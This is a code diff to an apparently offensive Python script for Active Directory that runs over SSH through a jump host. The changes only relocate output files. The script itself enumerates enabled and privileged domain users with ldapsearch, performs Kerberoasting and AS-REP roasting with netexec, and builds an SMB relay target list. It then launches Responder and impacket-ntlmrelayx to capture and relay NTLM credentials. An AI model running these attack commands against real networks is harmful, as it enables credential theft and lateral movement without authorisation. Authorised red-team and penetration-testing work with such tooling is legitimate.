@@ -231,31 +231,34 @@ def en_users(jh, dc_ip, user, password, domain):
         else:
             dns += ',dc='+item
 
+    # create remote directory
+    create_rem_dir = 'mkdir users-dump'
+    create = run_ssh_command(jh, create_rem_dir)
     
     
-    command1 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > enabled_users"
+    command1 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > users-dump/enabled_users"
 
-    command2 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(|(memberOf=CN=Domain Admins,"+dns+")(memberOf=CN=Enterprise Admins,CN=Users,"+dns+")(memberOf=CN=Schema Admins,CN=Users,"+dns+")(memberOf=CN=Administrators,CN=Builtin,"+dns+"))' sAMAccountName memberOf | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > high_priv_users"
+    command2 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(|(memberOf=CN=Domain Admins,"+dns+")(memberOf=CN=Enterprise Admins,CN=Users,"+dns+")(memberOf=CN=Schema Admins,CN=Users,"+dns+")(memberOf=CN=Administrators,CN=Builtin,"+dns+"))' sAMAccountName memberOf | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > users-dump/high_priv_users"
 
-    command3 =  "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + """' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName description | awk 'BEGIN {FS="\\n"; RS=""; OFS=","}{user=""; desc="";for (i=1; i<=NF; i++){if ($i ~ /^sAMAccountName:/) user=substr($i, 17);if ($i ~ /^description:/) desc=substr($i, 13);}print user, desc}' > users_descriptions"""
+    command3 =  "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + """' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName description | awk 'BEGIN {FS="\\n"; RS=""; OFS=","}{user=""; desc="";for (i=1; i<=NF; i++){if ($i ~ /^sAMAccountName:/) user=substr($i, 17);if ($i ~ /^description:/) desc=substr($i, 13);}print user, desc}' > users-dump/users_descriptions"""
 
     en = run_ssh_command(jh, command1)
     if len(en[2]) != 0:
         print(en[2])
         exit()
-    print('Enabled users gathered!', en)
+    print('Enabled users dumped.')
     en_adm = run_ssh_command(jh, command2)
     print('High privilege users gathered!')
     us_desc = run_ssh_command(jh, command3)
     print('Users and their description gathered!')
 
     # create local directory
-    create_local_dir = ['mkdir', f'enabled-users']
+    create_local_dir = ['mkdir', f'users-dump']
     create = subprocess.run(create_local_dir, capture_output=True, text=True)
     
-    copy_files(f'{jh}:~/enabled_users', f'enabled-users/enabled_users')
-    copy_files(f'{jh}:~/high_priv_users', f'enabled-users/high_priv_users')
-    copy_files(f'{jh}:~/users_descriptions', f'enabled-users/users_descriptions')
+    copy_files(f'{jh}:~/users-dump/enabled_users', f'users-dump/enabled_users')
+    copy_files(f'{jh}:~/users-dump/high_priv_users', f'users-dump/high_priv_users')
+    copy_files(f'{jh}:~/users-dump/users_descriptions', f'users-dump/users_descriptions')
 
 def roasting(jh, dc_ip, user, password, domain):
     netexec = run_ssh_command(jh, 'command -v netexec')
@@ -264,8 +267,12 @@ def roasting(jh, dc_ip, user, password, domain):
         print('Tool error:\n', netexec[2])
         exit()
 
-    kerb_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --kerberoasting kerberoasted-users"
-    asrep_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --asreproast asreproasted-users"
+    # create remote directory
+    create_rem_dir = 'mkdir roasting'
+    create = run_ssh_command(jh, create_rem_dir)
+
+    kerb_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --kerberoasting roasting/kerberoasted-users"
+    asrep_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --asreproast roasting/asreproasted-users"
 
     kerb = run_ssh_command(jh, kerb_cmd)
     print('Performing kerberoasting!')
@@ -276,8 +283,8 @@ def roasting(jh, dc_ip, user, password, domain):
     create_local_dir = ['mkdir', f'roasting']
     create = subprocess.run(create_local_dir, capture_output=True, text=True)
     
-    copy_files(f'{jh}:~/kerberoasted-users', f'roasting/kerberoasted-users')
-    copy_files(f'{jh}:~/asreproasted-users', f'roasting/asreproasted-users')
+    copy_files(f'{jh}:~/roasting/kerberoasted-users', f'roasting/kerberoasted-users')
+    copy_files(f'{jh}:~/roasting/asreproasted-users', f'roasting/asreproasted-users')
 
 
 def responder_run(jh, config_file=None):
@@ -327,12 +334,16 @@ def responder_run(jh, config_file=None):
                 for scan in host['scans']:
                     targets += scan['target']+'\n'
 
+        # create remote directory
+        create_rem_dir = 'mkdir relayx'
+        create = run_ssh_command(jh, create_rem_dir)
+    
         # write target list to kali box
-        command = f'echo "{targets}" > scope-signing'
+        command = f'echo "{targets}" > relayx/scope-signing'
         run_ssh_command(jh, command)
 
         # start netexec to create no smg signing list
-        command = 'netexec smb scope-signing --gen-relay-list no-smb-signing.txt'
+        command = 'netexec smb relayx/scope-signing --gen-relay-list relayx/no-smb-signing.txt'
         run_ssh_command(jh, command)        
 
         # turn smb and http off
@@ -344,8 +355,8 @@ def responder_run(jh, config_file=None):
         start_resp = run_ssh_command(jh, f"tmux new-session -d -s 'responder' '{command}'")
 
         # start ntlmrelayx
-        command = 'impacket-ntlmrelayx -tf no-smb-signing.txt -smb2support -socks'
-        start_relay =  run_ssh_command(jh, f"tmux new-session -d -s 'relayx' '{command}'")
+        command = 'impacket-ntlmrelayx -tf relayx/no-smb-signing.txt -smb2support -socks'
+        start_relay =  run_ssh_command(jh, f"tmux new-session -d -s 'ntlmrelayx' '{command}'")
                 
     else:
         # checking for tools
